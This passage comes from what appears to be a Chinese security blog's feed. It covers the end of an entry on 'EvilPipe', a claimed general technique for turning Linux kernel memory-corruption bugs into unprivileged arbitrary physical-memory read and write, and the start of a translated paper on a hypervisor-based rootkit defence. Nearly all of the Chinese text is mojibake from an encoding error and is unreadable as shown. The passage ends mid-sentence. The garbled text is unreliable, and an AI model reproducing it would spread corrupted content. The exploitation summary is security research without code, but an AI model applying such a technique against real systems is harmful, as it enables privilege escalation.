¸çš„ä»»ä½•ä¿¡æ¯ï¼Œä¸”ä¸ä¼šç•™ä¸‹ä»»ä½•ç—•è¿¹ï¼Œè¿™æ„å‘³ç€ EvilPipe å¯ä»¥è¢«åº”ç”¨äºè¿‘ä¹æ‰€æœ‰çš„æ”»å‡»ç¯å¢ƒã€‚</p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬è®¤ä¸º EvilPipe å¹¶ä¸ä»…ä»£è¡¨é’ˆå¯¹ pipe ç³»ç»Ÿè°ƒç”¨çš„åˆ©ç”¨æ–¹æ³•ï¼Œè€Œæ˜¯ä»£è¡¨äº†ä¸ä¼ ç»Ÿçš„æ¼æ´åˆ©ç”¨æŠ€æœ¯æ‰€ä¸åŒçš„ç ”ç©¶æ–¹å‘ï¼šå°†å†…æ ¸æ¼æ´åˆ©ç”¨æ–¹æ³•ä»ä¼ ç»Ÿçš„ä»£ç æ‰§è¡Œè½¬å‘æ„é€ é€»è¾‘æ¼æ´ï¼Œä»è€Œæ— éœ€ç›´æ¥ä¸ä¼—å¤šå†…æ ¸ä¿æŠ¤æªæ–½è¿›è¡Œç›´æ¥å¯¹æŠ—ï¼Œå¹¶å¤§å¹…å‡å°‘æ¼æ´åˆ©ç”¨å¯¹ç‰¹å®šäºæŒ‡å®šç¯å¢ƒçš„ä¾èµ–åº¦ã€‚æˆ‘ä»¬è®¤ä¸ºåœ¨æ¼æ´åˆ©ç”¨ä¸Šè¿™æ˜¯ä¸€ä¸ªå€¼å¾—ä»¤äººæ¢ç´¢çš„æ–¹å‘ã€‚</p><p>åœ¨å®Œæˆæ¦‚å¿µéªŒè¯ä¹‹åï¼Œæˆ‘ä»¬å°†å¤šä¸ª Linux å†…æ ¸ä¸­çš„å†…å­˜æŸåæ¼æ´æ”¹å†™ä¸º EvilPipeï¼Œå¹¶åœ¨å¤šä¸ªä¿æŠ¤å®Œå¤‡çš„ Linux ç³»ç»Ÿä¸‹å¯¹å¤šä¸ª <code>ï¼ˆæ­¤å¤„æš‚å®šï¼‰</code> çœŸå®ä¸–ç•Œä¸­çš„æ¼æ´å®Œæˆäº†å¯¹è¿™ç§åˆ©ç”¨æ‰‹æ³•çš„è¯„ä¼°ã€‚æˆ‘ä»¬å‘ç° EvilPipe åœ¨å¤šä¸ª <code>ï¼ˆæ­¤å¤„æš‚å®šï¼‰</code> çœŸå®ä¸–ç•Œçš„æ¼æ´ä¸Šå¯ä»¥å®Œæˆåˆ©ç”¨ï¼Œè¿™æ„å‘³ç€è¿™é¡¹æŠ€æœ¯å…·æœ‰å¼ºå¤§çš„èƒ½åŠ›ã€‚åœ¨å®Œæˆå¯åˆ©ç”¨æ€§è¯„ä¼°ä¹‹åï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§æ–°çš„ä¿æŠ¤æœºåˆ¶ï¼Œé€šè¿‡åœ¨æ•°æ®æ‹·è´å‰æ·»åŠ é¢å¤–çš„éªŒè¯æœºåˆ¶ä»¥é˜²æ­¢ EvilPipe ç±»å‹çš„åˆ©ç”¨æ–¹æ³•ï¼Œç»å®éªŒè¯„ä¼°ï¼Œæˆ‘ä»¬æ‰€æå‡ºçš„æ–°æœºåˆ¶å¸¦æ¥çš„è´Ÿæ‹…æ˜¯å¯ä»¥å¿½ç•¥ä¸è®¡çš„ã€‚</p><p>æ€»è€Œè¨€ä¹‹ï¼Œæœ¬æ–‡åšäº†å¦‚ä¸‹å·¥ä½œï¼š</p><ul><li>æˆ‘ä»¬æå‡ºäº†ä¸€ç§æ–°çš„é€šç”¨åˆ©ç”¨æŠ€æœ¯â€”â€”EvilPipeï¼Œè¿™é¡¹æŠ€æœ¯å…è®¸æˆ‘ä»¬å°†ç»å¤§å¤šæ•°çš„å†…æ ¸ä¸­çš„å†…å­˜æŸåæ¼æ´ï¼ˆç”šè‡³ä»…æ˜¯ä¸€ä¸ª â€˜\0â€™ å­—èŠ‚çš„å †æº¢å‡ºï¼‰ï¼Œè½¬æ¢ä¸ºæ— éœ€ä»»ä½•ç‰¹æƒçš„æ— é™çš„å¯¹ç‰©ç†å†…å­˜çš„ä»»æ„è¯»å†™èƒ½åŠ›</li><li>æˆ‘ä»¬åœ¨å¤šä¸ªçœŸå®ä¸–ç•Œçš„æ¼æ´ä¸Šåº”ç”¨äº† EvilPipe ï¼Œè¿™å±•ç¤ºäº†å…¶å¼ºå¤§çš„é€šç”¨æ€§ä¸æ˜“ç”¨æ€§ã€‚åŒæ—¶æˆ‘ä»¬å‘ç°äº†ä¸€äº›å¯èƒ½åº”ç”¨ç±»ä¼¼äº EvilPipe çš„é€»è¾‘æ”»å‡»æ‰‹æ³•çš„å†…æ ¸å¯¹è±¡ã€‚</li><li>æˆ‘ä»¬åˆ†æäº† Linux å†…æ ¸ç°æœ‰çš„é˜²å¾¡æœºåˆ¶åœ¨å¯¹æŠ—é€»è¾‘æ¼æ´ä¸Šçš„ä¸è¶³ï¼Œå¹¶æå‡ºäº†æ–°çš„ä¿æŠ¤æœºåˆ¶ã€‚æˆ‘ä»¬å¯¹è¿™é¡¹æ–°æœºåˆ¶è¿›è¡Œäº†è¯„ä¼°ï¼Œå‘ç°å…¶å¸¦æ¥çš„è´Ÿæ‹…æ˜¯å¯ä»¥å¿½ç•¥ä¸è®¡çš„ã€‚</li></ul></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;ã€Œã•ã‚‰ã°ã€å…¨ã¦ã®ãƒªãƒŒã‚¯ã‚¹ ã‚«ãƒ¼ãƒãƒ« ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã€‚ã€&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/tags/CTF/"/>
    
    <category term="D^3CTF" scheme="http://blog.arttnba3.cn/tags/D-3CTF/"/>
    
    <category term="Heap Overflow" scheme="http://blog.arttnba3.cn/tags/Heap-Overflow/"/>
    
    <category term="Cross-Cache Overflow" scheme="http://blog.arttnba3.cn/tags/Cross-Cache-Overflow/"/>
    
    <category term="Page-level Heap Fengshui" scheme="http://blog.arttnba3.cn/tags/Page-level-Heap-Fengshui/"/>
    
  </entry>
  
  <entry>
    <title>ã€PAPER.0x02ã€‘è®ºæ–‡ç¬”è®°ï¼šVirtual Wall: Filtering Rootkit Attacks To Protect Linux Kernel Functions </title>
    <link href="http://blog.arttnba3.cn/2023/04/14/PAPER-0X02_VTW/"/>
    <id>http://blog.arttnba3.cn/2023/04/14/PAPER-0X02_VTW/</id>
    <published>2023-04-13T17:46:35.000Z</published>
    <updated>2023-04-19T18:18:37.640Z</updated>
    
    <content type="html"><![CDATA[<p>ä»»ä½• rootkitï¼Œç»ˆå°†ç»³ä¹‹ä»¥æ³•ï¼</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00. ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>ç¬”è€…çš„æ¯•ä¸šè®¾è®¡å®Œæˆçš„è¦æ±‚ä¹‹ä¸€ä¾¿æ˜¯éœ€è¦å®Œæ•´ç¿»è¯‘ä¸€ç¯‡ä¸è¯¥é¢†åŸŸç›¸å…³çš„è®ºæ–‡ï¼Œåˆšå¥½ç¬”è€…åšçš„æ˜¯åç—…æ¯’ç›¸å…³çš„ï¼Œå› æ­¤å°±é€‰äº†<a href="https://ieeexplore.ieee.org/document/9186825">ã€ŠVirtual Wall: Filtering Rootkit Attacks To Protect Linux Kernel Functionsã€‹</a>è¿™ç¯‡è®ºæ–‡</p><p>æœ¬ç¯‡åšå®¢è¯´æ˜¯è®ºæ–‡ç¬”è®°ï¼Œå…¶å®å°±æ˜¯<strong>ä¸€ç¯‡å®Œæ•´çš„è®ºæ–‡ç¿»è¯‘ï¼šï¼‰</strong></p><blockquote><p>ä¸è¿‡åœ¨ç¬”è€…ç¿»è¯‘å®Œä¹‹åæ‰å‘ç°ä½œè€…ä¼¼ä¹æ˜¯åäººï¼Œ<del>æ„Ÿè§‰æœ‰ç‚¹äºäº†ï¼Œæ¯•ç«Ÿä¸»è¦æ˜¯å‡ºäºç¿»è¯‘çš„ç›®çš„ï¼Œä½†æ˜¯å´æ²¡èƒ½ä½“ä¼šåˆ°åŸæ±åŸå‘³çš„ native speaker çš„è®ºæ–‡</del></p></blockquote><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>å¦‚ä»Š Linux æœåŠ¡å™¨å·²è¢«åœ¨å‡ ä¹æ‰€æœ‰çš„äº‘ã€æ•°æ®ä¸­å¿ƒä¸è¶…çº§ç”µè„‘ä¸Šä½¿ç”¨ã€‚Linux å†…æ ¸åŠŸèƒ½æ­£é¢ä¸´ç€ä¸€ç§ç§°ä¹‹ä¸º <code>rootkits</code> çš„å¸¦æœ‰ root è®¿é—®æƒé™çš„æ¶æ„è½¯ä»¶æ”»å‡»ã€‚rootkits åœ¨å¦‚ä»Šçš„ Linux æœåŠ¡å™¨ä¸Šä»¥ <em>å¯è£…è½½å†…æ ¸æ¨¡å—</em> ï¼ˆLoadable Kernel Modulesï¼ŒLKMï¼‰çš„å½¢å¼å‡ºç°ã€‚è¿™äº›æ¨¡å—éšè—äºå…¶ä»–çš„å†…æ ¸å¯¹è±¡ä¹‹é—´ï¼Œä¸”å¯ä»¥é€šè¿‡ç¯¡æ”¹å†…æ ¸æœåŠ¡å‡½æ•°æ‰€éœ€çš„å…ƒæ•°æ®æ¥é‡å®šå‘å†…æ ¸æ§åˆ¶æµã€‚å†…æ ¸ rootkits åœ¨è½½å…¥åå¯¹ç”¨æˆ·æ˜¯ä¸å¯è§çš„ï¼Œè¿™å¯èƒ½ç»•è¿‡å¤§éƒ¨åˆ†çš„å®‰å…¨é˜²æŠ¤ã€‚rootkits åœ¨æ—¶é—´ä¸ç©ºé—´ä¸Šçš„è¡¨ç°éƒ½æ˜¯åˆ†æ•£çš„ï¼Œè¿™ä½¿å…¶å˜å¾—éš¾ä»¥è¢«å‘ç°æˆ–ç§»é™¤ã€‚ä¸ºäº†è§£å†³ rootkit çš„å¨èƒï¼Œæˆ‘ä»¬æå‡ºäº†ä¸€ç§é€šç”¨çš„ <em>è™šæ‹Ÿå¢™</em> ï¼ˆVirtual Wallï¼ŒVTWï¼‰æ–¹æ¡ˆä»¥é€šè¿‡è·Ÿè¸ªæ‰€å¸¦æ¥çš„å†…æ ¸æ´»åŠ¨æ¥è¿‡æ»¤å‡ºåµŒå…¥äº† rootkit çš„ LKMsã€‚è¿™ç§ VTW æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå¸¦æœ‰ rootkit æ£€æµ‹ä¸æ—¶é—´è¿½è¸ªèƒ½åŠ›çš„è½»é‡çº§ hypervisorã€‚é€šå¸¸æƒ…å†µä¸‹ Linux åœ¨ Guest æ¨¡å¼ä¸‹è¿è¡Œï¼Œå½“ä¸€ä¸ª LKM çš„æ‰§è¡ŒæŸå®³äº† VTW æ‰€è®¾ç½®çš„å®‰å…¨ç­–ç•¥æ—¶ï¼ŒOS æ§åˆ¶æƒå°†è½¬æ¢åˆ° Host æ¨¡å¼ï¼Œåœ¨ Host æ¨¡å¼çš„ VTW åŠæ—¶åœ°å¯ç”¨æ£€æµ‹å¹¶è·Ÿè¸ª rootkit äº‹ä»¶ã€‚æ¢è¨€ä¹‹ï¼Œæ½œåœ¨çš„ rootkit æ”»å‡»ä¼šè¢«æ£€æµ‹ã€è¢«è¿½è¸ªå¹¶è¢«åˆ†ç±»ä»¥åšå‡ºæœ‰æ„ä¹‰çš„è¿‡æ»¤å†³ç­–ã€‚æ•´ä¸ªæ£€æµ‹ä¸è¿½è¸ªè¿‡ç¨‹åŸºäºå†…å­˜è®¿é—®æ§åˆ¶ä¸äº‹ä»¶æ³¨å…¥æœºåˆ¶ã€‚å®éªŒæ€§è´¨çš„ç»“æœå±•ç¤ºäº† VTW é˜²æŠ¤ç³»ç»Ÿåœ¨åŠæ—¶æ£€æµ‹ä¸é˜²å¾¡å†…æ ¸ rootkit ä¸Šæ˜¯é«˜æ•ˆçš„ï¼Œä¸”æ‰§è¡Œ VTW çš„ CPU å¼€é”€å°äº 2%ã€‚ç›¸è¾ƒäºå…¶ä»–çš„é˜²æŠ¤æœºåˆ¶ï¼ˆå¦‚ DIKernel ç­‰ï¼‰ï¼Œæˆ‘ä»¬çš„ vs æ›´å®¹æ˜“ä»¥ä½æ€§èƒ½å¼€é”€åº”ç”¨äº Linux æœåŠ¡å™¨ã€‚æˆ‘ä»¬è¿˜ä¼šå°†æˆ‘ä»¬çš„ç³»ç»Ÿä¸ä¸ƒä¸ªå…¶ä»–çš„ rootkit é˜²å¾¡ç³»ç»Ÿè¿›è¡Œå¯¹æ¯”ã€‚</p><p><strong>Index Terms</strong>â€”â€”è®¿é—®æ§åˆ¶ï¼Œæ•°æ®å®Œæ•´æ€§ï¼Œæ“ä½œç³»ç»Ÿå®‰å…¨ï¼Œå†…æ ¸ä¿æŠ¤ä¸ç³»ç»Ÿæ¶æ„ã€‚</p><h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1 Introduction"></a>1 Introduction</h1><p>ç”±äºå†…æ ¸ rootkit çš„é«˜æƒé™ä¸å› æ­¤ç‰¹æ€§ï¼Œå…¶è¢«å¹¿æ³›åº”ç”¨äº Linux æœåŠ¡å™¨çš„å†…æ ¸æ”»å‡»ä¸­ã€‚å¦‚ä»Šå·²çŸ¥çš„å†…æ ¸ rootkits å¤§éƒ½ä»¥ <em>å¯è£…è½½å†…æ ¸æ¨¡å—</em> ï¼ˆLoadable Kernel Modulesï¼ŒLKMï¼‰çš„å½¢å¼å‡ºç°ï¼Œè¿™äº›æ¨¡å—å¯ä»¥é‡å®šä¹‰å†…æ ¸å†…å®¹å‡½æ•°ã€éšè—è‡ªèº«å¹¶éšè—ç›®æ ‡å¯¹è±¡ã€‚</p><p>å¯éšè—çš„ç‰¹æ€§å…è®¸å†…æ ¸ rootkit é€šè¿‡ â€œåŸºäº host çš„â€ æ¶æ„ç»•è¿‡å®‰å…¨å·¥å…·ã€‚è‡ªä»è¿™äº›å·¥å…·æ›´ä½çš„æƒé™é™åˆ¶äº†ä»–ä»¬çš„æ£€æµ‹èŒƒå›´ï¼Œæ›´ç³Ÿç³•çš„æ˜¯ä»–ä»¬åŸºäº <em>ç›®æ ‡æ“ä½œç³»ç»Ÿ</em> ï¼ˆtarget operating systemï¼ŒTOSï¼‰ç¯å¢ƒï¼Œè¿™å¯¼è‡´æ£€æµ‹ç»“æœçš„å¯é æ€§å¿…é¡»åŸºäº TOS çš„å®Œå…¨å®‰å…¨ã€‚ä¸å¹¸çš„æ˜¯ï¼Œå†…æ ¸ rootkit å¯ä»¥å·å·ç¯¡æ”¹ TOS ç¯å¢ƒä»¥ç ´åå…¶å®‰å…¨ã€‚</p><p>ä¸ºäº†å®ç°ä»–ä»¬çš„åŠŸèƒ½ï¼Œå†…æ ¸ rootkit éœ€è¦ç¯¡æ”¹å†…æ ¸å¯¹è±¡ã€‚å†…æ ¸ rootkit çš„æ“ä½œå¯¹è±¡åŒ…æ‹¬å¤šç§æ•°æ®ï¼Œä¾‹å¦‚æ§åˆ¶æ•°æ®ã€éæ§åˆ¶æ•°æ®ã€é™æ€æ•°æ®ä¸åŠ¨æ€æ•°æ®ã€‚ç†è®ºè€Œè¨€ï¼Œå†…æ ¸å®‰å…¨å¯ä»¥é€šè¿‡é™åˆ¶æ‰€æœ‰å¯¹æŒ‡å®šå†…æ ¸æ•°æ®çš„çªœæ”¹æ¥ç¡®ä¿ã€‚</p><p>ç„¶è€Œï¼Œä¸åŒçš„æ•°æ®é€šå¸¸åœ¨å†…æ ¸ç©ºé—´ä¸­åˆ†æ•£å­˜å‚¨ï¼Œå¸¦æœ‰ä¸åŒç‰¹æ€§çš„æ•°æ®å¯èƒ½ä¼šå­˜æ”¾åœ¨åŒä¸€å¼ å†…å­˜é¡µä¸­ã€‚å› æ­¤ï¼ŒåŸºäºé¡µçš„ä¿æŠ¤æœºåˆ¶æ— æ³•åœ¨ä¸å½±å“å…¶ä»–å†…æ ¸æ•°æ®çš„æƒ…å†µä¸‹ä¿æŠ¤ç›®æ ‡æ•°æ®ã€‚</p><p>åœ¨æ”»å‡»ä¸­ï¼Œå†…æ ¸ rootkit éœ€è¦ç¯¡æ”¹çš„å†…æ ¸æ•°æ®é€šå¸¸ä»…æœ‰å‡ å­—èŠ‚ã€‚åŒæ—¶ï¼Œæœ€å°çš„å†…å­˜æƒé™ç®¡ç†ç²’åº¦ä¸ºä¸€å¼ é¡µï¼Œå…¶é€šå¸¸å ç”¨ 4KBã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ºäº†ä¿æŠ¤æ•°ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬éœ€è¦é™åˆ¶æ‰€æœ‰å¯æ‰§è¡Œå®ä½“å¯¹ç›®æ ‡æ•°æ®æ‰€åœ¨é¡µçš„å†™æ“ä½œã€‚</p><p>åœ¨æ•°æ®å¤§å°ä¸ä¿æŠ¤ç²’åº¦é—´çš„ä¸åŒ¹é…ç ´åäº†å…¶ä»–å†…æ ¸å¯¹è±¡çš„åŸå§‹å±æ€§ï¼Œè¿™å½±å“äº†ç›¸å…³çš„æ‰§è¡Œå®ä½“çš„åŠŸèƒ½ä¸è¡¨ç°ã€‚ä¾‹å¦‚ï¼Œå†…æ ¸æ•°æ®ç»“æ„ä¸­çš„ VFS å‡½æ•°æŒ‡é’ˆæ¡ç›®é€šå¸¸ä¸ºå†…æ ¸ rootkit è¦ç¯¡æ”¹çš„ç›®æ ‡æ•°æ®ã€‚å°½ç®¡è¯¥æ¡ç›®å¹¶ä¸ä¼šè¢«åŠ¨æ€æ›´æ–°ï¼Œä¸å…¶å…±å€çš„çŠ¶æ€æè¿°æ¡ç›®å¯èƒ½ä¼šåœ¨æ‰§è¡Œå®ä½“è¿è¡Œæ—¶è¢«æ›´æ–°ã€‚è‹¥å¯¹çŠ¶æ€æè¿°çš„å†™æƒé™è¢«é™åˆ¶ï¼Œåˆ™å…³è”çš„æ‰§è¡Œæ¡ç›®å°†è¢«å½±å“ã€‚</p><p>å†…æ ¸ rootkit æœ‰ç€æ‰€æœ‰çš„ LKM ç‰¹æ€§ï¼Œä»–ä»¬å¯ä»¥è°ƒç”¨è‡ªå®šä¹‰å‡½æ•°æˆ–è£…è½½ rootkit çš„å¯¼å‡ºå‡½æ•°ä»¥ç¯¡æ”¹å†…æ ¸æ•°æ®ã€‚ä»–ä»¬å¯ä»¥åœ¨è£…è½½æ—¶æˆ–æ˜¯åœ¨ä»–ä»¬ç”Ÿå‘½å‘¨æœŸçš„ä»»ä½•æ—¶åˆ»å¯åŠ¨ä¸€æ¬¡æ”»å‡»ã€‚å› æ­¤ï¼Œå†…æ ¸ rootkit å¯ä»¥æ˜¯ä»»ä½•å°†è¢«æˆ–å·²è¢«è£…è½½çš„ LKMï¼Œå‚ä¸åˆ°ä¸€æ¬¡æ”»å‡»çš„å†…æ ¸ rootkits ä¾¿å¯èƒ½æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ª LKMsã€‚</p><p>ä»æ—¶é—´å±‚é¢ï¼Œå†…æ ¸ rootkit çš„æ”»å‡»æ—¶é—´æ˜¯éšæœºçš„ï¼›ä»ç©ºé—´å±‚é¢ï¼Œåœ¨ä¸€æ¬¡æ”»å‡»ä¸­çš„å‚ä¸è€…æ˜¯åˆ†æ•£çš„ã€‚è¿™ä¸¤ç§ç‰¹æ€§ä½¿å¾—å†…æ ¸ rootkit çš„æ”»å‡»äº‹ä»¶éš¾ä»¥é¢„æµ‹ã€æ”»å‡»çš„å‚ä¸è€…éš¾ä»¥è¿½è¸ªï¼Œè¿™æå¤§åœ°å½±å“äº†ç³»ç»Ÿå®‰å…¨ã€‚</p><p>æ”»å‡»å¼€å§‹æ—¶é—´çš„éšæœºæ€§ä½¿å¾—åŸºäºå•ä¸ªæˆ–å‘¨æœŸæ€§çš„æ£€æµ‹ä»…èƒ½è¾¾åˆ°æ—¶å€™æ£€æµ‹çš„æ•ˆæœã€‚å½“è¿™äº›æ–¹æ³•è¢«æ‰§è¡Œæ—¶ï¼Œå†…æ ¸ rootkits çš„æ”»å‡»å¯èƒ½å·²ç»å®Œæˆäº†ï¼Œç”šè‡³æ‰€æœ‰çš„ rootkits éƒ½å¯èƒ½è¢«ç§»é™¤äº†ã€‚ç»“æœä¾¿æ˜¯ï¼Œä»–ä»¬çš„æ£€æµ‹ä¸é˜²æŠ¤æ•ˆæœå°†è¢«æå¤§åœ°å½±å“ã€‚å†…æ ¸ rootkits é—´çš„ä¾èµ–å…³ç³»ä½¿å¾—æ”»å‡»çš„å½¢å¼æ›´åŠ å¤šæ ·åŒ–ã€‚</p><p>é€è¿‡ä¾èµ–å…³ç³»ï¼Œå†…æ ¸ rootkit å¯ä»¥è¿æ¥å¤šä¸ª LKMs ä»¥ç”¨ä½œå†…æ ¸æ”»å‡»ã€‚ç°æœ‰çš„å®‰å…¨æ–¹æ¡ˆä»…èƒ½æ£€æµ‹å½“å‰æ”»å‡»çš„ç›´æ¥å‘èµ·è€…ï¼Œä½†æ— æ³•è¯†åˆ«åœ¨æ•´ä¸ªæ”»å‡»è¿‡ç¨‹ä¸­çš„å…¶ä»–å‚ä¸è€…ã€‚æœªè¢«æ£€æµ‹çš„æ”»å‡»è€…å°†ä¸€ç›´æ½œä¼äºæ“ä½œç³»ç»Ÿä¸­ï¼Œç­‰å¾…æ¡ä»¶æˆç†Ÿæ—¶å†æ¬¡å‘èµ·æ”»å‡»ã€‚</p><p>æˆ‘ä»¬æå‡ºäº†ä¸€ç§å†…æ ¸ rootkit è¿‡æ»¤æ–¹æ³• VTW ä»¥ä¿æŠ¤å†…æ ¸åŠŸèƒ½ï¼Œä¾‹å¦‚ç³»ç»Ÿè°ƒç”¨è¡¨ã€å†…æ ¸åªè¯»å¯¹è±¡ã€LKM çŠ¶æ€æè¿°ç¬¦ã€<code>&quot;proc&quot;</code> æ–‡ä»¶å‡½æ•°æŒ‡é’ˆã€ç½‘ç»œæ–‡ä»¶æŒ‡é’ˆç­‰ã€‚è¿™ç§æ–¹æ³•ä½¿ç”¨ Intel VMX æŠ€æœ¯ä»¥å°†æ“ä½œç³»ç»Ÿåˆ†ä¸ºä¸¤ç§æ¨¡å¼ï¼šâ€œhostâ€ ä¸ â€œguestâ€ã€‚</p><p>è·¨è¿‡ä¸¤ç§æ‰§è¡Œæ¨¡å¼ï¼Œæˆ‘ä»¬ä¸ºå‹ç´§å†…æ ¸ rootkits åˆ›å»ºäº†æ£€æµ‹ã€é¢„é˜²ã€è·Ÿè¸ªç­–ç•¥ã€‚æœ¬è®ºæ–‡çš„ä¸»è¦è´¡çŒ®æ€»ç»“äºå¦‚ä¸‹å››ä¸ªæŠ€æœ¯å±‚é¢ï¼š</p><p>1ï¼‰ å»ºç«‹äº†ä¸€ä¸ªè½»é‡çº§çš„ hypervisorã€‚å…¶ä½¿ç”¨ Intel VMX æŠ€æœ¯æ¥é‡æ„ç³»ç»Ÿæ‰§è¡Œæ¨¡å¼ï¼Œä½¿å¾—å¯¹å†…æ ¸èµ„æºçš„è®¿é—®æ›´èƒ½è¢«æ£€æµ‹åˆ°ã€‚</p><p>2ï¼‰ å»ºç«‹äº†ä¸€ä¸ªèµ„æºè®¿é—®æ§åˆ¶æœºåˆ¶ã€‚å…¶å¯ä»¥æ„ŸçŸ¥å¯¹ç›®æ ‡å†…å­˜è®¿é—®çš„æ„ŸçŸ¥ã€é™åˆ¶ã€æ“æ§ï¼Œä¸”æ”¯æŒæˆ‘ä»¬åœ¨ â€œguestâ€ æ¨¡å¼ä¸‹ç›‘æ§ä¸æ§åˆ¶æ‰§è¡Œè·¯å¾„ã€‚</p><p>3ï¼‰ å»ºç«‹ä¸€ä¸ªæ§åˆ¶æµè·Ÿè¸ªæœºåˆ¶ã€‚è¯¥æœºåˆ¶æ”¯æŒè·Ÿè¸ªä¸åŒ LKMs çš„æ§åˆ¶æµè·³è½¬ä¸è¿”å›ã€‚</p><p>4ï¼‰ åˆ›å»ºäº†ä¸€ä¸ªæ£€æµ‹ã€é˜²æŠ¤ã€è·Ÿè¸ªå†…æ ¸ rootkits çš„å®‰å…¨æ¡†æ¶ã€‚é€šè¿‡ä¸Šè¿°æ¶æ„ä¸æœºåˆ¶ï¼Œå†…æ ¸ rootkits æ”»å‡»å¯ä»¥è¢«æ£€æµ‹ä¸é˜²æŠ¤ã€‚è¿™æ˜¯ç¬¬ä¸€æ¬¡æœ‰ä¸€ç§è·Ÿè¸ªå•æ¬¡æ”»å‡»ä¸­æ‰€æœ‰å‚ä¸çš„å†…æ ¸ rootkits çš„æ–¹æ³•è¢«å¼€å‘ã€‚</p><h1 id="2-Related-Previous-Work"><a href="#2-Related-Previous-Work" class="headerlink" title="2 Related Previous Work"></a>2 Related Previous Work</h1><p>ç”±äºå…¶è‰¯å¥½çš„æŠ—å¹²æ‰°èƒ½åŠ›ï¼ŒåŸºäºè™šæ‹ŸåŒ–çš„å†…æ ¸ä¿æŠ¤æ–¹æ³•å·²ç»å—åˆ°äº†é¢å¤–çš„å…³æ³¨ã€‚å°¤å…¶æ˜¯å¯¹å†…æ ¸ rootkits è€Œè¨€ï¼Œè¿™äº›æ–¹æ³•å±•ç¤ºäº†å‡ºè‰²çš„ä¼˜ç‚¹ã€‚ä»–ä»¬å¯ä»¥è¢«åˆ†ä¸ºä¸¤ç§ï¼šå…¥ä¾µå¼æ–¹æ³•ä¸éå…¥ä¾µå¼æ–¹æ³•ï¼Œå‰è€…éœ€è¦å‘ <em>ç›®æ ‡è™šæ‹Ÿæœº</em> ï¼ˆtarget virtual machineï¼ŒVTWï¼‰æ³¨å…¥é¢å¤–çš„å†…å®¹ä»¥è·å–æ‰€éœ€ä¿¡æ¯è€Œåè€…ä¸éœ€è¦ã€‚</p><p><em>ä¾µå…¥å¼æ–¹æ³•</em> ï¼ˆIntrusive Methodsï¼‰ã€‚ç”± Sebastion æœ€å…ˆæå‡ºçš„ X-TIER å°†ä¸€ä¸ªå†…æ ¸æ¨¡å—æ’å…¥åˆ°ç›®æ ‡è™šæ‹Ÿæœºï¼Œæ¥ä¸‹æ¥å…¶é€šè¿‡æ¨¡å—æ¥è¯»å– TVM æ•°æ®ç»“æ„ä»¥è·å–å…¶çŠ¶æ€ä¿¡æ¯ã€‚åœ¨è¿™ä¹‹å X-TIER é€šè¿‡ hypercall å°†æ‰€éœ€ä¿¡æ¯ä¼ é€’ç»™ hypervisorã€‚</p><p>SYRINGE ä½¿ç”¨å‡½æ•°è°ƒç”¨æ³¨å…¥æŠ€æœ¯æ¥åœ¨ TVM å¤–å¯ç”¨å¯¹ TVM å‡½æ•°çš„è°ƒç”¨ï¼Œä¸æ­¤åŒæ—¶å±€éƒ¨ç‰§ç¾ŠæŠ€æœ¯è¢«ç”¨äºæ£€æµ‹æ§åˆ¶æµå®Œæ•´æ€§ã€‚</p><p>Virtuoso ç»§ç»­ä»æ§åˆ¶é€»è¾‘çš„è§’åº¦è·å– TVM çŠ¶æ€ä¿¡æ¯ã€‚å…¶åœ¨ TVM ä¸­å¤šæ¬¡è¿è¡Œç¨‹åºå¹¶æå–ç›¸å…³æŒ‡ä»¤ä¸ç›¸å…³æ‰§è¡Œè·¯å¾„ï¼Œä¹‹åç”Ÿæˆå†…çœä»£ç æ‰€éœ€çš„è·¯å¾„è¢«ç¿»è¯‘ï¼Œæœ€å Virtuoso å°†æ‰€æœ‰çš„ä¿¡æ¯ç¿»è¯‘æˆå¯ä»¥åœ¨ TVM å¤–è¿›è¡Œè¯­ä¹‰é‡æ„çš„ä»£ç ã€‚</p><p>X-TIERã€SYRINGEã€Virtuoso é€šè¿‡åˆ†æç‰©ç†å†…å­˜å¹¶ä»¥å…¶ä½œä¸ºçœŸå®è§†è§’è€Œè·å¾—è¯­ä¹‰è§†è§’ã€‚ä»–ä»¬å¯ä»¥é€šè¿‡å¯¹æ¯”çœŸå®çš„è¯­ä¹‰è§†è§’ä¸ TVM çš„å†…éƒ¨è§†è§’æ¥æ‰¾åˆ°éšè—çš„å¯¹è±¡ï¼Œå¦‚è¿›ç¨‹ä¸æ–‡ä»¶ã€‚è‹¥å­˜åœ¨ä¸€ä¸ªéšè—å¯¹è±¡ï¼Œåˆ™ä»–ä»¬æ–­å®š TVM å·²ç»è¢«ç ´åè€Œä¸€ä¸ªå†…æ ¸ rootkit å¯èƒ½å­˜åœ¨äº TVM ä¸­ã€‚VMST åœ¨ rootkit æ£€æµ‹ä¸Šä½¿ç”¨åŒæ ·çš„æ–¹æ³•ã€‚</p><p><em>éå…¥ä¾µå¼æ–¹æ³•</em> ï¼ˆNon-Intrusive Methodsï¼‰ã€‚VMwatch çš„ç¬¬ä¸€æ­¥æ˜¯è·å– TVM çš„å†…å­˜ï¼Œä¹‹åä½¿ç”¨ TVM çš„å†…æ 